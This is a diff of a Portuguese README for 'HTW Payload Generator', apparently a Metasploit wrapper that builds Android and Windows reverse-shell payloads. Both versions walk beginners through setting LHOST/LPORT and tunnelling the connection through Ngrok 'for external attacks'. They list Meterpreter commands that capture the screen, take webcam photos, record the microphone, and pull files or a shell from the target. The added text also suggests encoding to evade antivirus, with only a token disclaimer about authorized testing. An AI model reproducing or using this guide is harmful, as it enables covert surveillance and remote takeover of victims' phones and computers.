@@ -1,65 +1,83 @@
-# 🔧 Tutorial Completo HTW Payload Generator
+Como Iniciar:
 
-```bash
-# ======================
-# 🚀 COMO USAR A FERRAMENTA
-# ======================
-
-# 1️⃣ INICIANDO O PROGRAMA
+Execute o programa com o comando:
 python3 htw.py
 
-# 2️⃣ MENU PRINCIPAL
-# ----------------------------------
-# [01] Quick Setup (Configuração rápida)
-# [02] Custom (Configuração manual)
-# [00] Sair
-# ----------------------------------
+Você verá um menu colorido com as seguintes opções:
 
-# 3️⃣ MODO QUICK SETUP (RECOMENDADO PARA INICIANTES)
-# - Escolha [01]
-# - Selecione:
-#    [1] Para Android (.apk)
-#    [2] Para Windows (.exe)
-# - Digite nome do arquivo (ex: payload.apk)
-# - Pronto! O payload será gerado automaticamente
+Quick Setup (configuração rápida)
 
-# 4️⃣ MODO CUSTOM (PARA USUÁRIOS AVANÇADOS)
-# - Escolha [02]
-# - Defina:
-#   • LHOST (IP do seu servidor)
-#   • LPORT (Porta de escuta)
-#   • Nome do arquivo de saída
-# - O payload será criado e o listener iniciado
+Custom (configuração manual)
 
-# ======================
-# 🌐 USANDO COM NGROK
-# ======================
+Sair
 
-# 1️⃣ EM OUTRO TERMINAL:
+Modo Quick Setup (Recomendado para Iniciantes):
+
+Selecione a opção 01
+
+Escolha o tipo de payload:
+
+Digite 1 para Android (gera arquivo .apk)
+
+Digite 2 para Windows (gera arquivo .exe)
+
+Informe um nome para o arquivo de saída (ex: payload.apk)
+
+A ferramenta irá gerar automaticamente o payload com as configurações padrão (LHOST=localhost, LPORT=4444)
+
+Modo Custom (Para Usos Avançados):
+
+Selecione a opção 02
+
+Configure manualmente:
+
+LHOST: IP do seu servidor (para rede local use seu IP interno, para internet use Ngrok)
+
+LPORT: Porta que será usada para a conexão
+
+Nome do arquivo de saída
+
+A ferramenta gerará o payload e iniciará automaticamente o listener no Metasploit
+
+Usando com Ngrok (Para Ataques Externos):
+
+Em um terminal separado, inicie o Ngrok com:
 ./ngrok tcp 4444
 
-# 2️⃣ ANOTE OS DADOS:
-# Exemplo: tcp://0.tcp.sa.ngrok.io:12345
-# • LHOST: 0.tcp.sa.ngrok.io
-# • LPORT: 12345
+Anote o endereço gerado (ex: tcp://0.tcp.sa.ngrok.io:12345)
 
-# 3️⃣ NO HTW:
-# Use esses dados no modo Custom
+No HTW Generator:
 
-# ======================
-# 💻 COMANDOS ÚTEIS (METERPRETER)
-# ======================
+Use o domínio do Ngrok como LHOST (0.tcp.sa.ngrok.io)
 
-screenshot      # Captura tela do dispositivo
-webcam_snap     # Tira foto da webcam
-record_mic      # Grava áudio do microfone
-download [file] # Baixa arquivos do alvo
-upload [file]   # Envia arquivos para o alvo
-shell           # Acessa terminal do dispositivo
+Use a porta do Ngrok como LPORT (12345)
 
-# ======================
-# ⚠️ IMPORTANTE
-# ======================
-# • Use apenas para testes autorizados
-# • Não use para atividades ilegais
-# • Mantenha o Ngrok rodando durante o ataque
+Comandos Úteis no Meterpreter:
+Após estabelecer a conexão, você pode usar:
+
+screenshot - Captura a tela do dispositivo
+
+webcam_snap - Tira foto pela webcam
+
+record_mic - Grava áudio do microfone
+
+download - Baixa arquivos do alvo
+
+upload - Envia arquivos para o alvo
+
+shell - Acessa o terminal do dispositivo
+
+Importante:
+
+Esta ferramenta deve ser usada apenas para testes de segurança autorizados
+
+Mantenha o Ngrok rodando enquanto estiver esperando a conexão
+
+Para bypass de antivírus, considere usar técnicas de encoding ou embedding
+
+Suporte:
+Para dúvidas ou problemas, consulte:
+
+GitHub: github.com/CipherShadow082
+
+Telegram: t.me/CipherShadow08
